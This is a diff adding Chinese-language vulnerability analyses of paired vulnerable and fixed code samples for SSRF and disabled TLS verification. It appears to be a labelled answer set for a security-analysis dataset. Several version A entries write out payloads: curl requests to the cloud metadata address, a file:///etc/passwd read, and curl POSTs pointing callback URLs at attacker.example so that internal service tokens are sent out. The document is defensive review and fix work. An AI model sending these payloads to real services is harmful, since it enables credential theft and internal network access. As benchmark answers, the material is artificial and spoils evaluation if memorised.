@@ -1,0 +1,147 @@
+### wave2-441-07 版本A
+入口: L8 HTTP GET query 参数 `url`（`request.args.get("url", "")`，路由 `/fetch-avatar`，样本内无任何鉴权层） | 次要: 无
+链: L8 取得用户完全可控的 `url` → L9 `if not url` 仅空值检查，任意非空串放行 → L12 `requests.get(url, verify=False, timeout=5, …)` 以本服务网络位置出站，scheme/主机零校验 → L14 `return upstream.content, 200` 把响应体原样回显给调用者（可读型 SSRF）；并发缺陷: L12 `verify=False` 主动关死 TLS 证书校验（CWE-295），L13 `headers={"X-Forwarded-Host": "avatar-svc.internal"}` 把产品内网身份头随任意攻击者指定目的地外发
+防御:
+  L9 `if not url: return "missing url", 400` → 伪防御: 仅拒空串，`?url=http://169.254.169.254/latest/meta-data/`、`?url=http://127.0.0.1:6379/` 等任意 http/https 目标全放行
+  （无其他防御层；L11 注释"信任用户随附的自定义 CA"与代码不符——代码里根本没有 CA 参数，实际是 `verify=False` 对所有目的地不校验）
+载荷: `curl "http://<target>/fetch-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"` → 响应体经 L14 回显（云元数据依赖部署环境，样本外假设）；纯样本内即可证的形态 `?url=http://127.0.0.1:<本地端口>/`，借回环网络位置探测并回读内网端口响应
+组合链: L8 匿名入口（样本内无鉴权）→ L12 可读 SSRF 任意目的地 → L13 `X-Forwarded-Host: avatar-svc.internal` 随请求发往该目的地 → 若内部服务信任该头做鉴权（样本外假设），SSRF 升级为冒用 `avatar-svc` 身份的已授权内网访问；L12 `verify=False` 使 https 链路可被 MITM 伪造响应后经 L14 回显
+锚句: 非 CWE-441 因 主缺陷是目的地未校验的服务端取回，按笔记主记 CWE-918；`X-Forwarded-Host` 借身份的完整利用依赖内部服务信任该头（样本外），不构成"产品作为非预期代理转交内部高权限服务"的完整形；非 CWE-79 因 L14 回显的是原始字节流，样本内无 HTML/JS 渲染上下文
+结论: 存在漏洞=true | CWE-918 服务端请求伪造（SSRF） | High
+修复: L12 前插入目的地校验——`from urllib.parse import urlparse`（stdlib，需新增导入）解析 hostname 对照常量 allowlist 集合字面量、scheme 强制 `https`，不命中即 400；L12 `verify=False` 改 `verify=True`（消除 CWE-295）；L13 删除 `X-Forwarded-Host` 身份头
+
+### wave2-441-07 版本B
+入口: L11 HTTP GET query 参数 `url`（`request.args.get("url", "")`，路由 `/fetch-avatar`） | 次要: 无
+链: 未发现可达污点流，原因: L12 `u = urlparse(url)` → L13 `if u.scheme != "https" or u.hostname not in AVATAR_ALLOWLIST` 在 L15 `requests.get` 之前把目的地钉死到 `{"cdn.example.com", "avatars.example-cdn.net"}`——直连内网 IP、`@` userinfo 混淆、尾点变体全部 fail closed；仅存重定向跟随残余面（见防御）
+防御:
+  L13 scheme 锁 `https` + hostname 常量 allowlist → 有效: `urlparse().hostname` 已剥 userinfo/端口并小写化，`https://cdn.example.com@10.0.0.1/` 解析出的 hostname 是 `10.0.0.1`，不命中 `AVATAR_ALLOWLIST` 返回 `bad url` 400；`https://cdn.example.com./x`（尾点）同样不命中集合（精确字符串匹配，fail closed）
+  L15 `requests.get(url, verify=True, …)` → 有效: TLS 证书校验未被削弱，allowlist 域被 MITM 需要合法证书链
+  残余: requests 默认 `allow_redirects=True`，L15 未关闭——若 `cdn.example.com` 上存在攻击者可控 302（样本外假设），可二段跳内网；L16 `return upstream.content, 200` 会回显响应体，一旦跳转成立即成可读 SSRF，故列为残余面而非可达漏洞（前提依赖样本外）
+载荷: 无可达利用；最接近的尝试 `?url=https://cdn.example.com@10.0.0.1/` 预期 L13 判 `u.hostname == "10.0.0.1"` 不命中集合 → `bad url` 400
+组合链: 无可达组合链。次要: L7 `HEADERS_INJECT = {"User-Agent": "avatar-svc/1.0"}` 仅是普通 UA 标识，且目的地已钉死，无身份外借风险
+锚句: 非 CWE-918 因 目的地被 scheme+hostname 双层校验封死，样本内不存在可达取回流；非 CWE-441 因 出站仅带普通 User-Agent，无可动用的凭证或回环信任
+结论: 存在漏洞=false | CWE-918 服务端请求伪造（SSRF）（候选，被 L13 allowlist 封死，未成立） | Low
+修复: 加固建议——L15 改 `requests.get(url, verify=True, timeout=5, headers=HEADERS_INJECT, allow_redirects=False)` 关闭重定向跟随，消除"allowlist 域 302 二段跳"残余面；如需收敛端口面，L13 补 `or (u.port not in (None, 443))`（`urlparse` 已在 L3 导入）
+
+自查清单（441-07 包）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`；本包版本A/版本B各一条
+- [x] 行号全部真实存在；`AVATAR_ALLOWLIST`、`HEADERS_INJECT`、`upstream` 等变量名均出自代码
+- [x] 判定"有漏洞"（版本A）时已逐条排除防御——样本内仅 L9 空值检查，已定性为伪防御
+- [x] 判定"安全"（版本B）时已枚举全部入口——本包入口仅 HTTP query `url`，无配置/环境/stdin 等非 HTTP 通道；防御逐段核验见版本B
+- [x] 版本A分析未引用版本B任何内容；结论只来自版本A自身代码
+- [x] 依赖样本外的判断（云元数据环境、allowlist 域可控 302）均已标"样本外假设"
+- [x] 未把其他案例的行号/结论串写进本包
+- [x] 本包代码完整，无缺失片段需要补充
+- [x] 本包无 SQL 判定，参数化覆盖检查不适用
+
+### wave2-441-08 版本A
+入口: L10 内部 API 方法参数 `userUrl`（`public byte[] fetch(String userUrl, byte[] userCaPem)`，调用方样本外） | 次要: L10 参数 `userCaPem` 声明后全程未用（死参数）
+链: L10 参数 `userUrl` → L23 `URL u = new URL(userUrl)`（scheme/主机零校验）→ L24 `u.openConnection().getInputStream()` 以 JVM 进程网络位置取回任意 URL → L25 `return in.readAllBytes()` 把内容返回调用者（可读型 SSRF；JVM 默认协议 handler 下 `file:///`、`ftp://` 同样可达）；并发缺陷: L15-L18 自定义 `X509TrustManager` 的 `checkServerTrusted`/`checkClientTrusted` 方法体为空 → L21 `ctx.init(null, new TrustManager[]{all}, new SecureRandom())` → L22 `HttpsURLConnection.setDefaultSSLSocketFactory(ctx.getSocketFactory())` 把"信任一切"工厂设为 JVM 进程级默认，污染 L24 及进程内样本外全部 `HttpsURLConnection` 出站（CWE-295）
+防御:
+  L11 注释"用户随附 CA 一并进信任库" → 伪宣称（注释撒谎）: 代码从未引用 `userCaPem`，L14 `ts.load(null, pwd)` 加载的是空信任库，实际生效的是信任一切的空实现 TrustManager
+  L15-L18 空 `checkServerTrusted` → 伪防御: 任何证书链（含自签名 `-----BEGIN CERTIFICATE-----`）直接放行，服务端认证形同虚设
+  （无目的地校验层：L23 之前对 `userUrl` 零检查）
+载荷: `new Avatars().fetch("http://169.254.169.254/latest/meta-data/", null)` → L25 返回响应字节（云元数据依赖部署环境，样本外假设）；样本内即可证的形态: `fetch("file:///etc/passwd", null)` 读本地文件，或 `fetch("https://attacker.example/collect", null)`——攻击者自签名证书即可被 L15-L18 接受
+组合链: L15-L18 信任一切 + L22 设为进程默认 → 进程内其他组件的 HTTPS 出站（样本外调用方）全部失去校验 → MITM 可篡改/伪造其他组件的 https 流量；与 L23 用户可控 `userUrl` 叠加：L25 返回给调用者的内容可被网络中间人任意伪造。次要: L12 `char[] pwd = "changeit".toCharArray()` 硬编码 KeyStore 口令（CWE-798；仅用于 L14 加载空内存库，可直接动用面极小，降档并入）
+锚句: 非 CWE-441 因 L25 内容直接返回调用者，无"转交内部高权限服务"的二跳，按笔记主记 CWE-918；非 CWE-798 主记因 `"changeit"` 仅用于 L14 加载空内存 KeyStore，不是能伪造会话/签名的 secret，按降档并入正文
+结论: 存在漏洞=true | CWE-918 服务端请求伪造（SSRF） | High
+修复: 删除 L15-L22 整段（默认 `HttpsURLConnection` 本就走默认信任链，无需自定义 SSLContext），尤其 L22 `setDefaultSSLSocketFactory` 的进程级全局调用必须移除；L23 之后用 `u.getProtocol()`/`u.getHost()`/`u.getPort()`（均为 L23 已用 `URL` 类的既有方法）对照 scheme/hostname/端口常量白名单，不命中即抛 `IllegalArgumentException`（L11 已有该异常用法）再放行；L12 `"changeit"` 口令移出源码
+
+### wave2-441-08 版本B
+入口: L9 内部 API 方法参数 `userUrl`（`public byte[] fetch(String userUrl)`，调用方样本外） | 次要: 无
+链: 未发现可达污点流，原因: L10 `if (!userUrl.startsWith("https://avatars.example-cdn.net/"))` 的前缀含尾斜杠——URL 的 authority 在第一个 `/` 处终止，该前缀把 authority 钉死为字面 `avatars.example-cdn.net`（userinfo 形态 `https://avatars.example-cdn.net@evil.example.com/` 在 `net` 后是 `@` 而非 `/`，startsWith 失败；`net.evil.com/`、`net:443@…` 同理失败），L13 `URL u = new URL(userUrl)` 解析出的主机必为 allowlist 域；L15/L16 保持完整 TLS 校验
+防御:
+  L10 `startsWith("https://avatars.example-cdn.net/")` → 有效: 尾部 `/` 使任何 authority 变体（userinfo `@`、端口 `:`、子域后缀 `.`）都无法同时满足"前缀命中"与"解析主机不同"——字符串检查面与 URL 解析面在此前缀下重合；大小写变体被拒属过严（fail closed，无安全影响）
+  L15 `conn.setSSLSocketFactory((SSLSocketFactory) SSLSocketFactory.getDefault())` → 有效: 系统默认信任链，目标证书必须有效
+  L16 `conn.setHostnameVerifier(HttpsURLConnection.getDefaultHostnameVerifier())` → 有效: 主机名与证书 SAN 校验未被削弱
+  残余: 校验（L10 字符串）与连接（L13 解析）分两步的写法脆弱——若未来有人删掉前缀尾斜杠即失守（当前代码内不可达）；DNS 在检查后二次解析，但 allowlist 域 DNS 非攻击者可控（样本外假设）
+载荷: 无可达利用；尝试 `new Avatars().fetch("https://avatars.example-cdn.net@evil.example.com/", …)` 预期 L10 判 startsWith 失败 → L11 抛 `IllegalArgumentException("url not allowed")`
+组合链: 无可达组合链。次要: L10 精确大小写匹配会误拒 `https://Avatars.example-cdn.net/`——可用性瑕疵，非安全缺陷
+锚句: 非 CWE-918 因 前缀尾斜杠把 authority 钉死，样本内不存在主机可控的取回流；非 CWE-295 因 L15-L16 显式使用默认信任链与默认主机名校验器，证书校验未被禁用
+结论: 存在漏洞=false | CWE-918 服务端请求伪造（SSRF）（候选，被 L10 前缀 + L15/L16 默认 TLS 校验封死，未成立） | Low
+修复: 加固建议——把 L10 的字符串前缀检查改为解析后校验：将 L13 `URL u = new URL(userUrl);` 提到检查之前，用 `u.getProtocol().equals("https") && "avatars.example-cdn.net".equals(u.getHost()) && (u.getPort() == -1 || u.getPort() == 443)` 判定（均为 `URL` 类既有方法），消除"改前缀即失守"的脆弱耦合
+
+自查清单（441-08 包）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`；本包版本A/版本B各一条
+- [x] 行号全部真实存在；`userCaPem`、`ts.load`、`setDefaultSSLSocketFactory`、`getDefaultHostnameVerifier` 等均出自代码
+- [x] 判定"有漏洞"（版本A）时已逐条排除防御——L11 注释宣称与 L15-L18 伪 TrustManager 均已证伪（实为放行一切）
+- [x] 判定"安全"（版本B）时已枚举全部入口——方法参数 `userUrl` 为唯一入口（内部 API 传参通道已核，无配置/env/stdin 通道）；防御逐段核验见版本B
+- [x] 版本A分析未引用版本B任何内容
+- [x] `fetch` 调用方未贴出、云元数据环境依赖——均已标"样本外假设"
+- [x] 无跨案例串写
+- [x] 缺失片段已点名（`fetch` 的调用点），未猜着补全调用链
+- [x] 本包无 SQL 判定，参数化覆盖检查不适用
+
+### wave2-441-13 版本A
+入口: L9 HTTP POST JSON body 字段 `callback_url`（`body.get("callback_url", "")`，路由 `/register-webhook`） | 次要: L10 `scope` 注册者自报值，L16 `save_webhook(callback, scope)` 原样入库（`save_webhook` 函数体样本外）
+链: L9 取得用户完全可控的 `callback` → L12 `probe = requests.get(callback, timeout=3, …)` 以本服务（内网身份）网络位置出站，scheme/主机零校验 → L13 `headers={"Authorization": "Bearer " + INTERNAL_TOKEN}` 把内部服务凭证随请求发往攻击者指定主机 → 凭证外送先于 L14 `if probe.status_code >= 500` 检查发生（顺序无效化）；响应体不回显（L14 仅消费状态码），SSRF 为盲态 + 状态码 oracle
+防御:
+  L14 `if probe.status_code >= 500` → 伪防御: 检查发生在 L12-L13 出站与凭证外送之后，`{"callback_url": "http://attacker.example/log"}` 返回 200 放行、4xx/3xx 也放行，凭证已外泄无法撤回
+  （无其他防御层：无 allowlist、无内网段检查、无 scheme 校验）
+载荷: `curl -X POST http://<target>/register-webhook -H 'Content-Type: application/json' -d '{"callback_url":"http://attacker.example/log","scope":"public"}'` → attacker.example 的访问日志收到 `Authorization: Bearer <INTERNAL_TOKEN>`（前提: `INTERNAL_TOKEN` 已在模块层定义——样本内未定义；若确无定义则 L13 抛 `NameError`、链不可达，见下条样本外标注）
+组合链: L6 匿名 POST 端点 → L12 盲 SSRF（`>=500` 与否构成对内网端口的存活/状态探测 oracle）→ L13 服务 Bearer token 外送攻击者主机 → 攻击者持该凭证直连信任它的内部服务（最后一跳的授权范围样本外）；危害按组合链最坏情形评估，但"token 能解锁什么"依赖样本外内部服务信任关系，按"两可记 High"规则不虚高
+锚句: 非 CWE-441 因 探针把请求发往攻击者指定的任意外部地址，而非作为非预期代理转交内部高权限服务，按笔记主记 CWE-918；非 CWE-798 因 样本内无硬编码凭证字面量（`INTERNAL_TOKEN` 定义处样本外），危害形态是运行时凭证经 L13 外送
+结论: 存在漏洞=true | CWE-918 服务端请求伪造（SSRF） | High
+修复: L12 前加目的地校验——`from urllib.parse import urlparse`（stdlib，需新增导入）解析 hostname 对照常量 allowlist 集合字面量，不命中即 400；L13 移除 `Authorization` 头——验证探针不得携带内部凭证出站；附带: L10 `scope` 建议限定枚举白名单（`save_webhook` 函数体样本外，需补其定义以核入库后果）
+
+### wave2-441-13 版本B
+入口: L20 HTTP POST JSON body 字段 `callback_url`（`body.get("callback_url", "")`） | 次要: L21 `scope` 自报值（L32 入库，`save_webhook` 样本外）
+链: 未发现可达污点流，原因: L22 `host = urlparse(callback).hostname` → L23 `if host not in EGRESS_ALLOWLIST` 钉死 `{"hooks.partner.example.com"}` → L25-L27 对该域解析出的每个 IP 执行 `is_ip_forbidden` 复检 `FORBIDDEN_NETS` → L29 `requests.get(callback, timeout=3, headers=probe_headers)` 仅带 `User-Agent`，L30-L31 只消费状态码不回显响应体；userinfo 混淆（`https://hooks.partner.example.com@10.0.0.1/`）解析出的 hostname 是 `10.0.0.1` 被 L23 拒绝
+防御:
+  L23 hostname 常量 allowlist → 有效: `urlparse().hostname` 已剥 userinfo/端口并小写化，尾点 `hooks.partner.example.com.` 与混淆主机均不命中集合（fail closed）
+  L25-L27 解析 IP 复检 → 有效: 即便 allowlist 域被解析到 `127.0.0.1`/`169.254.x.x`，`is_ip_forbidden`（L13-L15）逐条命中 `FORBIDDEN_NETS` 拒绝；该域 DNS 非攻击者可控（样本外假设：解析不被劫持）
+  L28-L29 探针仅带 `{"User-Agent": "webhook-probe/1.0"}` → 有效: 版本内无任何凭证/身份头随出站请求外送
+  残余: L29 默认 `allow_redirects=True`——allowlist 域上攻击者可控 302（样本外假设）可盲探内网（无凭证、响应体不回显，仅状态码），判残余面而非可达漏洞
+载荷: 无可达利用；`{"callback_url":"https://hooks.partner.example.com@10.0.0.1/x"}` 预期 L23 判 hostname=`10.0.0.1` → `callback host not allowed` 400
+组合链: 无可达组合链。次要: L11 `FORBIDDEN_NETS` 未含 `100.64.0.0/10`（CGNAT），在 L23 allowlist 成立时不可达，属纵深缺口
+锚句: 非 CWE-918 因 hostname allowlist + 解析 IP 复检双层封死，可达污点流不存在；非 CWE-441 因 探针仅带普通 User-Agent，无服务身份可借、无回环信任
+结论: 存在漏洞=false | CWE-918 服务端请求伪造（SSRF）（候选，被 L23/L25-L27 封死，未成立） | Low
+修复: 加固建议——L29 改 `requests.get(callback, timeout=3, headers=probe_headers, allow_redirects=False)` 关闭重定向跟随；L9-L11 `FORBIDDEN_NETS` 增补 `"100.64.0.0/10"`（`ipaddress` 已在 L1 导入）
+
+自查清单（441-13 包）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`；本包版本A/版本B各一条
+- [x] 行号全部真实存在；`INTERNAL_TOKEN`、`probe_headers`、`FORBIDDEN_NETS`、`EGRESS_ALLOWLIST`、`is_ip_forbidden` 均出自代码
+- [x] 判定"有漏洞"（版本A）时已逐条排除防御——样本内仅 L14 状态码检查，已定性为伪防御（顺序无效化）
+- [x] 判定"安全"（版本B）时已枚举全部入口——body 字段 `callback_url` 与 `scope` 两个，均已核；无其他通道
+- [x] 版本A分析未引用版本B任何内容
+- [x] `INTERNAL_TOKEN`/`save_webhook` 未在样本内定义、allowlist 域 DNS 与 302 可控性——均已标"样本外假设"
+- [x] 无跨案例串写
+- [x] 缺失片段已点名（`INTERNAL_TOKEN` 定义处、`save_webhook` 函数体），未猜着补全
+- [x] 本包无 SQL 判定，参数化覆盖检查不适用
+
+### wave2-441-14 版本A
+入口: L9 HTTP POST JSON body 字段 `callbackUrl`（解构自 `req.body`，路由 `/integrations/webhook`） | 次要: L9 `secret` 原样入库（L15 `db.saveWebhook`，`db` 样本外）；L6 `process.env.SVC_TOKEN` 为 token 来源
+链: L9 解构取得用户完全可控的 `callbackUrl` → L11 `await fetch(callbackUrl, {…})` 以进程网络位置出站，scheme/主机零校验 → L12 `headers: { "X-Introspect-Auth": INTERNAL_SVC_TOKEN }` 把服务身份 token 随请求发往攻击者指定主机 → token 外送先于 L14 `if (!resp.ok)` 检查发生；响应体不回显（仅 L14 消费 `resp.ok`），SSRF 为盲态 + ok/非 ok oracle
+防御:
+  L14 `if (!resp.ok)` → 伪防御: 出站与 token 外送在 L11-L12 已完成，`{"callbackUrl":"http://attacker.example/log"}` 返回 2xx 放行、仅 4xx/5xx 走 400，凭证已外泄无法撤回
+  （无其他防御层：L9-L11 之间零校验；L8 端点无任何鉴权中间件，样本内可证——L4 仅 `app.use(express.json())`）
+载荷: `curl -X POST http://<target>:8080/integrations/webhook -H 'Content-Type: application/json' -d '{"callbackUrl":"http://attacker.example/log","secret":"x"}'` → attacker.example 记录到请求头 `X-Introspect-Auth: <SVC_TOKEN>`（前提: 环境变量 `SVC_TOKEN` 已配置——样本外假设；未配置时该头值为 `undefined` 字符串，外泄物无效）
+组合链: L8 匿名端点（无认证，可达性放大项）→ L11 盲 SSRF → L12 服务身份 token 外送 → 攻击者持 token 冒充本服务访问内部服务（最后一跳的授权范围样本外）；按组合链最坏情形评估但受"样本内可证"约束记 High——若该 token 可解锁 RCE 级内部接口（样本外）则升级 Critical
+锚句: 非 CWE-306 主记因 端点缺认证是可达性放大项，主 sink 是出站取回与凭证外送，缺认证并入组合链陈述；非 CWE-798 因 token 取自 `process.env.SVC_TOKEN` 而非硬编码字面量
+结论: 存在漏洞=true | CWE-918 服务端请求伪造（SSRF） | High
+修复: L11 前校验 `callbackUrl`——`const u = new (require("url").URL)(callbackUrl)`（node 内置，需新增 require）后判 `u.protocol === "https:"` 且 `u.hostname` 命中常量 allowlist 集合字面量，不命中即 400；L12 移除 `X-Introspect-Auth` 头——健康探针不得携带服务 token 出站
+
+### wave2-441-14 版本B
+入口: L16 HTTP POST JSON body 字段 `callbackUrl`（解构自 `req.body`） | 次要: 无（版本内已无凭证头出站）
+链: 未发现可达污点流，原因: L18 `new URL(callbackUrl)` 解析失败即 400 → L19 `u.protocol !== "https:" || !INTEGRATION_HOSTS.has(u.hostname)` 钉死 `{"hooks.partner.example.com", "callbacks.vendor.example"}` → L22-L23 `dns.resolve6`/`dns.resolve4` → L24 `[...addrs, ...addrs4].some(isForbiddenIp)` 对解析出的 v4/v6 逐条复检 → L27 探针仅带 `User-Agent`，L28 仅消费 `resp.ok` 不回显响应体；userinfo 混淆（`https://hooks.partner.example.com@10.0.0.1/`）的 WHATWG hostname 为 `10.0.0.1`，被 L19 拒绝
+防御:
+  L19 protocol+hostname allowlist → 有效: WHATWG `URL` 的 `u.hostname` 已剥 userinfo/端口并小写化；大小写变体被解析器小写后命中集合（无影响），尾点 `hooks.partner.example.com.` 不在集合 → 400（fail closed）
+  L22-L24 解析复检 → 有效(首跳): 解析出的 IPv4/IPv6 逐条过 `FORBIDDEN` 正则（L9/L11-L13）；allowlist 域 DNS 非攻击者可控（样本外假设）。注: L9 正则漏 `fe80::/10` 链路本地（`fe80::1` 不匹配 `f[cd][0-9a-f]{2}:`）与 `100.64.0.0/10`——在 L19 allowlist 成立时该层不可达，属纵深缺口而非可达漏洞
+  L27 探针仅带 `{"User-Agent": "webhook-probe/1.0"}` → 有效: 无服务凭证可外泄
+  残余: node-fetch 默认 `redirect: "follow"`（L27 未关闭）——allowlist 域上攻击者可控 302（样本外假设）可盲探内网（响应体不回显），判残余面
+载荷: 无可达利用；`{"callbackUrl":"https://hooks.partner.example.com@10.0.0.1/x"}` 预期 L19 判 hostname=`10.0.0.1` → `host not allowed` 400
+组合链: 无可达组合链。次要: L29 `await db.saveWebhook(req.body)` 的 `db` 未在样本内定义（样本外），且 `req.body` 整体入库未过滤额外字段
+锚句: 非 CWE-918 因 L19 allowlist 钉死 protocol+hostname、L22-L24 解析复检，直连与混淆变体均被封死；非 CWE-441 因 L27 探针仅带普通 User-Agent，无回环信任可借
+结论: 存在漏洞=false | CWE-918 服务端请求伪造（SSRF）（候选，被 L19/L22-L24 封死，未成立） | Low
+修复: 加固建议——L27 改 `fetch(callbackUrl, { redirect: "manual", headers: { "User-Agent": "webhook-probe/1.0" } })` 关闭重定向跟随（node-fetch 既有选项）；L9 正则增补 `fe[89ab][0-9a-f]{2}:`（链路本地 fe80::/10）与 `100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.`（CGNAT 100.64.0.0/10）
+
+自查清单（441-14 包）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`；本包版本A/版本B各一条
+- [x] 行号全部真实存在；`callbackUrl`、`INTERNAL_SVC_TOKEN`、`INTEGRATION_HOSTS`、`FORBIDDEN`、`isForbiddenIp` 均出自代码
+- [x] 判定"有漏洞"（版本A）时已逐条排除防御——样本内仅 L14 `resp.ok` 检查，已定性为伪防御
+- [x] 判定"安全"（版本B）时已枚举全部入口——body 字段 `callbackUrl` 为唯一污点入口，无其他通道；防御逐段核验见版本B
+- [x] 版本A分析未引用版本B任何内容
+- [x] `db` 定义、`SVC_TOKEN` 环境配置、allowlist 域 302 可控性、token 解锁范围——均已标"样本外假设"
+- [x] 无跨案例串写
+- [x] 缺失片段已点名（`db` 模块、`SVC_TOKEN` 环境变量），未猜着补全
+- [x] 本包无 SQL 判定，参数化覆盖检查不适用
